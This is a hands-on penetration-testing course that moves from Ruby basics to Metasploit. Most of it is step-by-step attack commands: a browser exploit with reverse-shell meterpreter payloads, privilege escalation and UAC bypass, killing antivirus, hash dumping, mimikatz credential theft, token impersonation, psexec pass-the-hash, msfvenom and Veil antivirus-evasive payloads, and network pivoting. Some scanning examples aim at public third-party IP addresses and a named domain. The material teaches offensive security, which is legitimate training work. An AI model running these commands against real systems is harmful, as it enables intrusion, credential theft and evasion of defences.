puts “We are Learning how to PenTest”
end
end

#Now let’s define an object for our Method

joe = Msfnl.new
joe.learning




- An argument is a value or variable that is passed to the function while calling it. In the following example, while 
calling the puts() function, we are sending a string value to the function. This string value is used by the 
function to perform some particular operations.

puts (“Pentesting”)

 
- There are many useful string functions in Ruby. String functions make it easy to work with strings. Now, we will 
explain some useful string functions with an example.

- The length function calculates the length of a string. The upcase function converts a string to uppercase. And the 
reverse function reverses a string. The following example demonstrates how to use the string functions.

55.class
"I Love Programming".class
"I Love Pentesting".length
"Pown that box".upcase
"Love" + "To Root Boxes"
"evil".reverse
"evil".reverse.upcase

 

-  expressions and shortcuts. In the below example, ‘a’ is an operand, ‘3’ is an operand,  ‘=’ is 
an operator, and ‘a=3’ is the expression. A statement consists of one or multiple expressions. Following are the 
examples of some expressions.

a = 3
b = 6
a+b+20
d = 44
f = d
puts f




 

- shortcuts. +=, *= are the shortcuts. These operators are also called abbreviated 
assignment operators. Use the shortcuts to get the effect of two statements in just one. Consider the following 
statements to understand the shortcuts.

g = 70
g = g+44
g += 33

- In the above statement, g is incremented by 33 and then the total value is assigned to g.

g *= 3

- In the above statement, g is multiplied with 3 and then assigned to g.

- Example

- Comparison Operators, Loops, Data Types, and Constants

- Comparison operators are used for comparing one variable or constant with another variable or constant. We will show 
how to use the following comparison operators.
‘Less than’ operator (<): This operator is used to check whether a variable or constant is less than another 
variable or constant. If it’s less than the other, the ‘less than’ operator returns true.
‘Equal to’ operator (==): This operator is used to check whether a variable or constant is equal to another variable 
or constant. If it’s equal to the other, the ‘equal to’ operator returns true.
‘Not equal to’ operator (!=): This operator is used to check whether a variable or constant is not equal to another 
variable or constant. If it’s not equal to the other, the ‘not equal to’ operator returns true.


numberofports = 55
puts "number of ports found during scan" if numberofports < 300
numberofports = 400
puts "number of ports found during scan" if numberofports < 300
puts "number of ports found during scan" if numberofports == 300
puts "number of ports found during scan" if numberofports != 300
Example


- the ‘OR’ operator and the ‘unless’ keyword. This symbol ‘||’ represents the logical ‘OR’ operator. 

- This operator is generally used to combine multiple conditions.
- In case of two conditions, if both or any of the conditions is true, the ‘OR’operator returns true. Consider the 

- following example to understand how this operator works.

ports = 100
puts "number of ports found on the network" if ports<100 || ports>200
puts "number of ports found on the network" if ports<100 || ports>75
#unless
portsbelow1024 = 50
puts "If the ports are below 1024" unless portsbelow1024 < 1000
puts "If the ports are below 1024" unless portsbelow1024 < 1055
puts "If the ports are below 1024" unless portsbelow1024 < 20


- The ‘unless’ keyword is used to do something programmatically unless a condition is true.



- Loops are used to execute statement(s) repeatedly. Suppose you want to print a string 10 times.

- See the following example to understand how a string is printed 10 times on the screen using a loop.

10.times do puts "strategicsec" end
#Or use the curly braces
10.times {puts "strategicsec"}



- Changing Data Types: Data type conversion is an important concept in Ruby because it gives you flexibility while 
working with different data types. Data type conversion is also known as type casting.



- In the following example, a and b are integers. So when a is divided by b, an integer division is performed. As a 
result, 23/25 becomes 0.

- On the other hand, the integer variables c and d are converted to float. So the division gives the result in decimal 
points.

24/4
14.0/5.0
a = 23
b = 25
print a/b
c = 26
d = 33
print c.to_f/d.to_f




- Constants: Unlike variables, the values of constants remain fixed during the program interpretation. So if you 
change the value of a constant, you will see a warning message.




- Multiple Line String Variable, Interpolation, and Regular Expressions

- A multiple line string variable lets you assign the value to the string variable through multiple lines. 

strategicsec = <<mark
welcome
to the
best
metasploit
course
on the
market
mark
puts strategicsec



- Interpolation lets you evaluate any placeholder within a string, and the placeholder is replaced with the value that 
it represents. So whatever you write inside #{ } will be evaluated and the value will be replaced at that position. 
Examine the following example to understand how interpolation works in Ruby.



a = 4
b = 6
puts “a * b = a*b”
puts “ #{a} * #{b} = #{a*b} “
person = “Joe McCray”
puts “IT Security consultant person”
puts “IT Security consultant #{person}”

- Notice that the placeholders inside #{ } are evaluated and they are replaced with their values.


- Regular expression is a powerful technique for text searching and text manipulation. Ruby provides built-in support 
for regular expressions through the Regexp class. So the regular expressions in Ruby are the objects of Regexp type.



- In regular expressions, we define patterns to perform text search and advanced text manipulations. String literals 
and metacharacters constitute a pattern. // characters mark the beginning and end of a pattern in Ruby.
The following example shows how the substring “today”
is placed in the main string.

a = "Woot Woot, we are learning regular expressions!!"
puts a.sub(/^..../, 'Today')
puts a.sub(/^..../, 'Today')



- Let’s Loop the expressions. This example shows how to loop the expressions.

a.scan(/...../) {|w| puts w}
a.scan(/\S\S/) {|w| puts w}



- Character classes

strategicsec = "I Scanned 45 hosts and found 500 vulnerabilities"
"I love metasploit and what it has to offer!".scan(/[lma]/) {|y| puts y}
"I love metasploit and what it has to offer!".scan(/[a-m]/) {|y| puts y}



- Arrays, Push and Pop, and Hashes


- In the following example, numbers is an array that holds 6 integer numbers.



numbers = [2,4,6,8,10,100]
puts numbers[0]
puts numbers[4]
numbers[2] = 150
puts numbers




- Now we will show how you can implement a stack using an array in Ruby. A stack has two operations - push and pop. 



framework = []
framework << "modules"
framework << "exploits"
framework << "payloads"
framework.pop


- Hash is a collection of elements, which is like the associative array in other languages. Each element has a key 
that is used to access the element.


- Hash is a Ruby object that has its built-in methods. The methods make it easy to work with hashes.
In this example, 'metasploit' is a hash. 'exploits', 'microsoft', 'Linux' are the keys, and the following are the 
respective values: 'what module should you use', 'Windows XP' and 'SSH'.


metasploit = {'exploits' => 'what module should you use', 'microsoft' => 'Windows XP', 'Linux' => 'SSH'}
print metasploit.size
print metasploit["microsoft"]
metasploit['microsoft'] = 'redhat'
print metasploit['microsoft']



- Writing Ruby Scripts


- Let’s take a look at one of the ruby modules and see exactly now what it is doing. Now explain to me exactly what 
this program is doing. If we take a look at the ruby program what you find is that it is a TCP port scanner that 
someone made to look for a specific port. The port that it is looking for is port 21 FTP.

cd ~/toolz/metasploit/modules/auxiliary/scanner/portscan
ls
ack.rb  ftpbounce.rb  syn.rb  tcp.rb  xmas.rb

- Lets look at tcp.rb
  	


- Let’s take the time now to create and design our own port scanner what we will design here is a port scanner that 
will scan for port up to 0-1024. And we will add a function in there for the port scanner to prompt us stating OPEN 
port if it detects it. This is a pretty basic script, but it will help you in the event that you need to write 
something on the fly.



- PortScanner.rb :

require 'socket'
require 'timeout'

puts "Enter IP Address to Scan:"
ipaddress = gets

1.upto(1024) {|port|
  begin
    timeout(5) do
      TCPSocket.open(ipaddress.chop, port)
    end
    puts "Response/Port Open: #{port}"
  rescue Timeout::Error
    # uncomment the following line to show closed ports (noisy!)
    #puts "No Response /Port closed: #{port}"
  rescue
    # uncomment the following line to show closed ports (noisy!)
    #puts "No Response /Port closed: #{port}"
  end
}








######################################
# Chapter 2: Metasploit Fundamentals #
######################################

- Let’s take a little look at Metasploit Framework

- First, we should take note of the different directories, the Modular Architecture.

The modules that make up the Modular Architecture are
Exploits
Auxiliary
Payload
Encoder
Nops


Important directories to keep in mind for Metasploit, in case we'd like to edit different modules, or add our own, 

are

Modules
Scripts
Plugins
External
Data
Tools

- Let's take a look inside the Metasploit directory and see what's the

cd ~/toolz/metasploit
ls




- Now let's take a look inside the Modules directory and see what's there.

cd ~/toolz/metasploit/modules
ls


       
The auxiliary directory is where the things like our port-scanners will be, or any module that we can run that does 
not necessarily need to - have a shell or session started on a machine.

The exploits directory has our modules that we need to pop a shell on a box.
The external directory is where we can see all of the modules that use external libraries from tools Metasploit uses 
like Burp Suite
- Let’s take a look at the external directory

cd ~/toolz/metasploit/external
ls
 

- Our data directory holds helper modules for Metasploit to use with exploits or auxiliary modules.

cd ~/toolz/metasploit/data
ls
  

- For example, the wordlist directory holds files that have wordlists in them for brute-forcing logins or doing DNS 
brute-forcing

cd ~/toolz/metasploit/data/wordlists
ls
  	

- The Meterpreter directory inside of the data directory houses the DLLs used for the functionality of Meterpreter 
once a session is created.

cd ~/toolz/metasploit/data/meterpreter
ls


- In our case, the dll's are at

'~/.rvm/gems/ruby-2.1.5@metasploit-framework/gems/meterpreter_bins-0.0.13/meterpreter/'

ls ~/.rvm/gems/ruby-2.1.5@metasploit-framework/gems/meterpreter_bins-0.0.13/meterpreter/

- The scripts inside the scripts/Meterpreter directory are scripts that Meterpreter uses for post-exploitation, things 
like escalating privileges and dumping hashes.

These are being phased out, though, and post-exploitation modules are what is being more preferred.
The next important directory that we should get used to is the 'tools' directory. Inside the tools directory we'll 
find a bunch of different ruby scripts that help us on a pentest with things ranging from creating a pattern of code 
for creating exploits, to a pattern offset script to find where at in machine language that we need to put in our 
custom shellcode.

The final directory that we'll need to keep in mind is the plugins directory, which houses all the modules that have 
to do with other programs to make things like importing and exporting reports simple.
Now that we have a clear understanding of what all of the different directories house, we can take a closer look at 
the exploits directory and get a better understanding of how the directory structure is there, so if we make our own 
modules we're going to have a better understanding of where everything needs to go.

cd ~/toolz/metasploit/modules/exploits
ls



- The exploits directory is split up into several different directories, each one housing exploits for different types 
of systems. I.E. Windows, Unix, OSX, dialup and so on.
Likewise, if we were to go into the 'windows' directory, we're going to see that the exploits have been broken down 
into categories of different types of services/programs, so that you can pick out an exploit specifically for the 
service you're trying to exploit. Let's dig a little deeper into the auxiliary directory and see what all it holds 
for us.

cd ~/toolz/metasploit/modules/auxiliary/
ls
      


- And a little further into the directory, let's take a look at what's in the scanner directory

cd ~/toolz/metasploit/modules/auxiliary/scanner/
ls
  
- And one more folder deeper into the structure, let's take a look in the portscan folder

cd ~/toolz/metasploit/modules/auxiliary/scanner/portscan
ls
  	

- If we run 'cat tcp.rb' we'll find that this module is simply a TCP scanner that will find tcp ports that are open 
and report them back to us in a nice, easily readable format.

cat tcp.rb
  	


- Just keep in mind that all of the modules in the auxiliary directory are there for information gathering and for use 
once you have a session on a machine.
Taking a look at the payload directory, we can see all the available payloads, which are what run after an exploit 
succeeds.

cd ~/toolz/metasploit/modules/payloads/
ls
 	


- There are three different types of payloads: single, stagers, and staged. Each type of payload has a different 
application for it to be used as.
Single payloads do everything you need them to do at one single time, so they call a shell back to you and let you 
do everything once you have that shell calling back to you.
Stagers are required for limited payload space so that the victim machine will call back to your attack box to get 
the rest of the instructions on what it's supposed to do. The first stage of the payload doesn't require all that 
much space to just call back to the attacking machine to have the rest of the payload sent to it, mainly being used 
to download Stages payloads.


- Stages are downloaded by stagers and typically do complex tasks, like VNC sessions, Meterpreter sessions, or bind 
shells.

cd singles
cd windows
ls
 


- We can see several different payloads here that we can use on a windows system. Let's take a look at adduser.rb and 
see what it actually does.

cat adduser.rb

Which when looking at the code, we can see that it will add a new user called "Metasploit" to the machine and give 
the new user "Metasploit" a password of "Metasploit$1" Further down in the file we can actually see the command that 
it gives Windows to add the user to the system.


- Stagers just connect to victim machine back to yours to download the Stages payload, usually with a 

windows/shell/bind_tcp or windows/shell/reverse_tcp

cd ../../stagers
ls
  	


- Again, we can see that we have stagers for multiple systems and code types.

ls windows/
  	


As you can see, the stagers are mainly just to connect to the victim, to setup a bridge between us and the victim 
machine, so we can upload or download our stage payloads and execute commands.
Lastly, we can go to our stages directory to see what all payloads are available for us to send over for use with 
our stagers...

cd ../stages
ls
 	


Again, we can see that our stages are coded for particular operating systems and languages.
We can take a look at shell.rb and see the shellcode that would be put into the payload that would be staged on the 
victim machine which would be encoded to tell the victim machine where to connect back to and what commands to run, 
if any.

- Other module directories include nops, encoders, and post. Post modules are what are used in sessions that have 
already been opened in meterpreter, to gain more information on the victim machine, collect hashes, or even tokens, 
so we can impersonate other users on the system in hopes of elevating our privileges.

cd ../../../post/
ls
cd windows/
ls
  	


Inside the windows directory we can see all the post modules that can be run, capture is a directory that holds all 
the modules to load keyloggers, or grab input from the victim machine. Escalate has modules that will try to 
escalate our privileges. Gather has modules that will try to enumerate the host to get as much information as 
possible out of it. WLAN directory holds modules that can pull down WiFi access points that the victim has in 
memory/registry and give you the AP names as well as the WEP/WPA/WPA2 key for the network.

##################
# Day 1 Homework #
##################
Please take screenshots of you doing the first 10 videos in this playlist
https://www.youtube.com/playlist?list=PL1512BD72E7C9FFCA

###################################################
# Section 2: Actually Using Metasploit (For real) #
###################################################

sudo /sbin/iptables -F
 
cd ~/toolz/metasploit
 
./msfconsole

##############################################
# Run any Linux command inside of MSFConsole #
##############################################
ls
 
pwd
 
ping -c1 yahoo.com
 
nmap 192.168.153.163
 
nmap yahoo.com
 
 
 
-------------------------------
- You're on the outside scanning publicly accessable targets.
 
 
 
use auxiliary/scanner/portscan/tcp
 
set RHOSTS 54.69.156.253
 
set PORTS 80,1433,1521,3306,8000,8080,8081,10000                       
 
run
 
-------------------------------
use auxiliary/scanner/http/     (press the tab key, then press y to look through the http options)
 
 
- Here is an example:
use auxiliary/scanner/http/trace_axd
 
        - So let's do a quick google search for someone with trace.axd file
        - filetye:axd inurl:trace.axd
 
set RHOSTS 52.10.254.211
 
set VHOST endlessvacation.com
 
run
 
-------------------------------
 
 
use auxiliary/scanner/http/http_version                
 
set RHOSTS 54.69.156.253
 
set RPORT 8081
 
run
 
 
-------------------------------
 
use auxiliary/scanner/http/tomcat_enum                   
 
set RHOSTS 54.69.156.253
 
set RPORT 8081
 
run
 
 
 
-------------------------------
- In my opinion a much better option is a script called 'discover' from Lee Baird.
 
- You can get it here: https://github.com/leebaird/discover
 
- On the Ubuntu attack host you can run discover by typing the following:
cd ~/toolz/discover
sudo ./discover
 
 
- From here you can just follow the prompts. It will run both Nmap NSE scripts and Metasploit aux modules with all of the correct parameters for you.
 
 
##################################
# Basic Client-Side Exploitation #
##################################
 
echo j0e-r0x > /home/strategicsec/j0e-r0x.txt                   (You can of course replace j0e-r0x with yourname)
 
sudo /sbin/iptables -F
 
cd ~/toolz/metasploit
 
./msfconsole
 
use exploit/windows/browser/ie_cgenericelement_uaf
 
set ExitOnSession false
 
set URIPATH /ie8
 
set PAYLOAD windows/meterpreter/reverse_tcp
 
set LHOST 192.168.153.164                                            (Make sure you change this to your ubuntu ip address)
 
exploit -j
 
 
- Now from the Win7 host, use Internet Explorer 8 to connect to the exploit address (local address)
- given to you by metasploit.
 
- The address will be something like:
 
http://192.168.153.164:8080/ie8                                            (Make sure you change this to your ubuntu ip address)
 
 
 
- This will simulate a victim clicking on your malicious link and being exploited with a browser exploit.
 
 
###########################
# Client-Side Enumeration #
###########################
 
 
- You can list the active sessions by typing:
 
sessions -l
 
 
 
 
- You can "interact" with any active session by typing sessions -i 3 (replace 3 with the session number you want to interact with)
 
 
sessions -i 1
 
 
 
 
 
- You should now see Metasploit's meterpreter prompt.
 
 
********************************** Figure out who and where you are **********************************
 
meterpreter> sysinfo
 
 
meterpreter> getuid
 
 
meterpreter> ipconfig
 
 
meterpreter> run post/windows/gather/checkvm
 
 
meterpreter> run get_local_subnets
 
 
 
********************************** Escalate privileges and get hashes **********************************
 
 
meterpreter> use priv
 
 
--Option 1: GetSystem
meterpreter> getsystem
 
--Option 2:
meterpreter > run post/windows/escalate/getsystem
 
--Option 3:
meterpreter> background
back
use post/windows/escalate/droplnk
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.153.164                                            (Make sure you change this to your ubuntu ip address)
set LPORT 1234
exploit
 
--Option 4:
use exploit/windows/local/bypassuac
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.153.164                                            (Make sure you change this to your ubuntu ip address)
set LPORT 12345
exploit
 
--Option 5:
use exploit/windows/local/service_permissions
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.153.164                                            (Make sure you change this to your ubuntu ip address)
set LPORT 5555
exploit
 
--Option 6:
use exploit/windows/local/trusted_service_path
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.153.164                                            (Make sure you change this to your ubuntu ip address)
set LPORT 4567
exploit
 
 
--Option 7:
use exploit/windows/local/ppr_flatten_rec
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.153.164                                            (Make sure you change this to your ubuntu ip address)
set LPORT 7777
exploit
 
--Option 8:
use exploit/windows/local/ms_ndproxy
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.153.164                                            (Make sure you change this to your ubuntu ip address)
set LPORT 7788
exploit
 
 
--Option 9:
use exploit/windows/local/ask
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.153.164                                            (Make sure you change this to your ubuntu ip address)
set LPORT 7799
exploit
 
 
meterpreter > getuid
Server username: win7-64-victim\Workshop
meterpreter > getsystem
...got system (via technique 1).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
 
--------------------------------------------------------
 
meterpreter> run killav
 
meterpreter> run post/windows/gather/hashdump
 
meterpreter > ps                (search for a process running as NT AUTHORITY\SYSTEM)
 
meterpreter > migrate 2800      (your process id WILL NOT be 2800, but make sure you use one that is running at NT AUTHORITY\SYSTEM)
 
meterpreter> run post/windows/gather/credentials/credential_collector
 
 
********************************** Steal Tokens **********************************
 
meterpreter > getsystem
 
meterpreter > use incognito
 
meterpreter > list_tokens -u
 
meterpreter > list_tokens -g
 
meterpreter > impersonate_token                         <-- choose who you want to impersonate but be sure to use 2 slashes in the name (ex: impersonate_token domain\\user)
 
meterpreter> getuid
 
 
************ Stealing credentials and certificates ************
- NOTE: Most of the stuff after 'kerberos' DOES NOT work, but is given here so you know the correct syntax to use when connected to AD or dealing with smart/CAC cards.
 
meterpreter > getsystem
 
meterpreter > load mimikatz
 
meterpreter > kerberos
 
meterpreter > mimikatz_command -f sekurlsa::logonPasswords -a "full"
 
meterpreter > msv                                                               <-- Your AD password
 
meterpreter > livessp                                                           <-- Your Windows8 password
 
meterpreter > ssp                                                               <-- Your outlook password
 
meterpreter > tspkg                                                             <-- Your AD password
 
meterpreter > wdigest                                                           <-- Your AD password
 
meterpreter > mimikatz_command -f crypto::listStores
 
meterpreter > mimikatz_command -f crypto::listCertificates
 
meterpreter > mimikatz_command -f crypto::exportCertificates CERT_SYSTEM_STORE_CURRENT_USER
 
meterpreter > mimikatz_command -f crypto::patchcapi
 
meterpreter> search -d <directory> -f <file-pattern>
 
 
********************************** Enumerate the host you are on **********************************
 
meterpreter > run getcountermeasure
 
meterpreter> run winenum
 
meterpreter > run post/windows/gather/enum_applications
 
meterpreter > run post/windows/gather/enum_logged_on_users
 
meterpreter > run post/windows/gather/usb_history
 
meterpreter > run post/windows/gather/enum_shares
 
meterpreter > run post/windows/gather/enum_snmp
 
meterpreter> reg enumkey -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
 
 
********************************** Prove access **********************************
 
meterpreter> upload /home/strategicsec/j0e-r0x.txt c:\\
 


********************************** Lateral Movement *******************************
 
 
Now we can run the PSEXEC exploit.
-- Option 1:
use exploit/windows/smb/psexec
 
set SMBUser Workshop
 
set SMBPass password
 
set RHOST 192.168.153.163
 
set payload windows/meterpreter/reverse_tcp
 
set LHOST 192.168.153.164
 
set LPORT 2345
 
exploit
 
 
 
 
-- Option 2:
use exploit/windows/smb/psexec
 
set SMBUser Workshop
 
set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
 
set payload windows/meterpreter/reverse_tcp
 
set RHOST 192.168.153.163                      
 
set LHOST 192.168.153.164
 
set LPORT 5678
 
exploit


#####################
# Fix broken PSExec #
#####################
- We use the shell command to get to the Victim Dos command so we can add a registry field.
 
meterpreter > execute -c -H -f cmd -a "/k" -i
reg /?
 
 
- Created a registry field to the Victim computer, this will allow us to access the machine using and exploit via PSEXEC.
 
C:\Windows\system32> reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system  /v LocalAccountTokenFilterPolicy  /t REG_DWORD  /d  1



###########################################
# Chapter 3: Custom Meterpreter Scripting #
###########################################


- In this lab we will be looking at how you can use some custom Meterpreter scripts to do more than what Metasploit 

can offer.  This will also show you the flexibility of the Meterpreter scripts.
 
- We're going to start off with a simple Hello World script first.  
 
   
echo 'print_status("Hello World")' > /home/strategicsec/toolz/metasploit/scripts/meterpreter/helloworld.rb
 
 
- This next portion is up to you, exploit your test box and end up with a Meterpreter shell.
 
- Lets test out our helloworld.rb Meterpreter script.
 
 
meterpreter> run helloworld
 
 
- So far so good, now we can build on this base.  Lets add a couple more API calls to the script.
 
- Open /home/strategicsec/toolz/metasploit/scripts/meterpreter/helloworld.rb in your favorite and add following 

line.
vi /home/strategicsec/toolz/metasploit/scripts/meterpreter/helloworld.rb
 
 
print_error("this is an error!")
print_line("this is a line")
 
- Now run the script:
 
meterpreter> run helloworld
 
 
- Now that we have the basics down, we're going to do something a little more exciting.  
- The architecture to follow when creating these scripts goes as follows:
 
def getinfo(session)
        begin
        	<stuff goes here>
        rescue ::Exception => e
        	<stuff goes here>
        end
end


- Copy and paste the following code into our helloworld.rb script:
 
def getinfo(session)
    begin
       sysnfo = session.sys.config.sysinfo
       runpriv = session.sys.config.getuid
       print_status("Getting system information ...")
       print_status("The target machine OS is #{sysnfo['OS']}")
       print_status("The computer name is #{'Computer'} ")
       print_status("Script running as #{runpriv}")
    rescue ::Exception => e
      print_error("The following error was encountered #{e}")
   end
end
 
getinfo(client)
 
 
 
- Now run the script:
 
meterpreter> run helloworld
 
 
- We can expand it by adding actual system commands to the script, lets look at how we can do this.
 
 
def list_exec(session,cmdlst)
    print_status("Running Command List ...")
    r=''
    session.response_timeout=120
    cmdlst.each do |cmd|
       begin
          print_status "running command #{cmd}"
          r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
          while(d = r.channel.read)
 
             print_status("#{d}")
          end
          r.channel.close
          r.close
       rescue ::Exception => e
          print_error("Error Running Command #{cmd}: #{e.class} #{e}")
       end
    end
 end
 
commands = [ "set",
    "ipconfig  /all",
    "arp -a"]
 
list_exec(client,commands)
 
 
 
- Run the script:
 
meterpreter> run helloworld
  





################################################
# Chapter 4: Writing Meterpreter Resource Files #
################################################


- In this lab we are going to create a binary payload via msfpayload then craft a .rc file that automates the 
process to setup the multi handler listener.
 
- We will start off by creating the msfvenom

sudo /sbin/iptables -F
	strategicsec

cd ~/toolz/metasploit
 
./msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=192.168.153.164 -f exe > /home/strategicsec/Desktop/meterpreter.exe
 
sudo chmod 777 /home/strategicsec/Desktop/meterpreter.exe
 
- In the syntax above, we set the payload, set the local host address to connect back too, then redirected the 
malicious payload to our desktop by issuing the correct path. We will also change the permissions on it to 777 just 
to make it easy for us to use WinSCP to copy it over to our Win7 machine.
 
- Next we are going to create a .rc (resource file) file that will automate the process for setting up a listener.
 
- Navigate to the /home/strategicsec/toolz/metasploit/ so that when you create the .rc file you can save it in the 
working directory.
 
 
- Type 'touch meterpreter.rc' to create the file.
touch meterpreter.rc
 
- Type 'echo use exploit/multi/handler  >> meterpreter.rc' to be appended to the .rc file.
echo use exploit/multi/handler  >> meterpreter.rc
 
- Type 'echo set PAYLOAD windows/meterpreter/reverse_tcp  >> meterpreter.rc' to be appended to the .rc file.
echo set PAYLOAD windows/meterpreter/reverse_tcp  >> meterpreter.rc
 
- Type 'echo set LHOST 192.168.153.164>> meterpreter.rc' to be appended to the .rc file.
echo set LHOST 192.168.153.164>> meterpreter.rc
 
- Type 'echo exploit -j -z >> meterpreter.rc' to be appended to the .rc file.
echo exploit -j -z >> meterpreter.rc
 
- Then cat the meterpreter.rc out to verify that everything in the file looks ok.
cat meterpreter.rc
 
Now at the command prompt, type 'sudo ./msfconsole -r meterpreter.rc' to start the msfconsole module and call/run 

the 'meterpreter.rc' file.
./msfconsole -r meterpreter.rc
 
- Once the msfconsole starts, the meterpreter resource file is executed and the listener is automatically setup.  It is now listening for a connection!
 
- Now you must transfer the malicious meterpreter payload to the victim machine (you may do so by any means necessary, we have physical access so we transferred it via usb.
 
- Click on the payload and create the meterpreter session.
 
- Type 'sessions -l' to list your open sessions, and 'sessions -i 1' to indicate that you want to interact with 

meterpreter session under id 1.
 
exit -y
    	



***********************************
* Getting Serious About .rc files *
***********************************


touch /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
echo run getcountermeasure >> /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
echo run winenum >> /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
echo run post/windows/gather/enum_applications >> /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
echo run post/windows/gather/enum_logged_on_users >> /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
echo run post/windows/gather/checkvm >> /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
 
 
- Ok, that was fun. Now let's take a quick look at the .rc file we just created.
cat /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
 
 
 
touch /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
 
 
echo use exploit/windows/browser/ie_cgenericelement_uaf >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
 
echo set ExitOnSession true >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
 
echo set URIPATH /ie8 >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
 
echo set PAYLOAD windows/meterpreter/reverse_tcp >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
 
echo set LHOST 192.168.153.164 >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc                            

            
 
echo set AutoRunScript multi_console_command -rc /home/strategicsec/toolz/metasploit/autorun-walk-through.rc >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
 
echo exploit -j -z >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
 
 
 
- Ok, that was more fun than the previous one. Now let's take a quick look at the .rc file we just created.
cat /home/strategicsec/toolz/metasploit/autorun-walk-through.rc

cat /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc 
 
- Alright, enough already. Let's run this thing.
./msfconsole -r old-faithful-ie8.rc





#################################
# Chapter 5: Anti-Virus Evasion #
#################################
------------------------------------------------------------
- Now it is time to work on some anti-virus evasion. Veil is the new tool on the scene for AV evasion.
sudo pip install PyInstaller
        strategicsec
 
cd /home/strategicsec/toolz/Veil-Evasion/setup
 
sudo ./setup.sh
        /home/strategicsec/toolz/metasploit/            (when it asks for the path to Metasploit)
 
cd /home/strategicsec/toolz/Veil-Evasion/
 
sudo python Veil-Evasion.py
 
update
 
clean
 
y
 
list
 
info 5
 
use 5
 
set LHOST 192.168.230.128
 
info
 
generate
 
        payload         (when it asks for a base name)
 
exit
 
sudo mv /usr/share/veil-output/compiled/payload.exe /home/strategicsec/            (my file path for payload.exe might be different)
 
sudo chmod 777 /home/strategicsec/payload.exe
 
cd ~/toolz/metasploit
 
./msfconsole  -r /usr/share/veil-output/handlers/payload_handler.rc
 
 
- From your Win7 host use WinSCP to copy test.exe from the Ubuntu host to your Win7 desktop.
- double click test.exe and see if you get a Meterpreter session
 
 
 
use exploit/windows/local/ask
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.230.128                                            (Make sure you change this to your ubuntu ip address)
set LPORT 7799
exploit
 
 
meterpreter > getuid
Server username: win7-64-victim\Workshop
meterpreter > getsystem
...got system (via technique 1).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
 
meterpreter> ps
 
meterpreter> migrate 2110                                       (Make sure this process is running as: NT AUTHORITY\SYSTEM
 
meterpreter> run killav
 
meterpreter> run post/windows/gather/hashdump
 
meterpreter> run post/windows/gather/credentials/credential_collector
 
meterpreter > load mimikatz
 
meterpreter > kerberos
 
meterpreter > background
 
exit -y






###########################################
# Section 3: Tunneling For Fun and Profit #
###########################################

*****************************Enumerate the network you are on ***************************
 
meterpreter > run netenum
 
meterpreter > run netenum -ps -r 192.168.153.0/24
 
meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.153.0/24
 
 
 
********************************** Set up your Pivot **********************************
 
meterpreter > background
                                                        <-- background the session
        You want to get back to this prompt:
        msf exploit(handler) > back                     <--- you need to get to main msf> prompt
 
 
 
        sessions -l                                     <--find a session you want to pivot through (note the IP and session number)
       
        Now set up Pivot with a route add
        ---------------------------------
 
route print
 
route add 192.168.153.163 255.255.255.0 1                       <-- Use correct session id (2), it may be 3, or 4 (make sure you are on msf> prommpt, not meterpreter)
 
 
route print                                             <----- verify new route
 
******************************Scan through your Pivot ******************************
 
use auxiliary/scanner/portscan/tcp                      <-- Run aux modules through your pivot
 
set THREADS 10
 
set RHOSTS 192.168.153.0/24				<-- Keep changing this IP and re-running the scan until you find something you want to attack
 
set PORTS 445
 
run
 
 
************************* Lateral movement through your Pivot *************************
 
-- Option 1:
use exploit/windows/smb/psexec
 
set RHOST 192.168.153.163
 
set LPORT 2345
 
set SMBUser Workshop
 
set SMBPass password
 
exploit
 
 
 
 
-- Option 2:
use exploit/windows/smb/psexec
 
set SMBUser Workshop
 
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
 
set payload windows/meterpreter/reverse_tcp
 
set RHOST 192.168.153.163                      
 
set LHOST 192.168.153.164
 
set LPORT 5678
 
exploit
 
 
 
-- Option 3:
background
use auxiliary/admin/smb/upload_file
 
set SMBUser Workshop
 
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
 
set LPATH /home/strategicsec/binaries/wce.exe
 
set RPATH "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\wce.exe"
 
set RHOST 192.168.153.163                      
 
run
 
 
 
-- Option 4:
use auxiliary/admin/smb/upload_file
 
set SMBUser Workshop
 
set SMBPass password
 
set LPATH /home/strategicsec/binaries/wce.exe
 
set RPATH "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\wce.exe"
 
set RHOST 192.168.153.163                      
 
run
 
 
-- Option 5:
use exploit/multi/handler
set ExitOnSession false
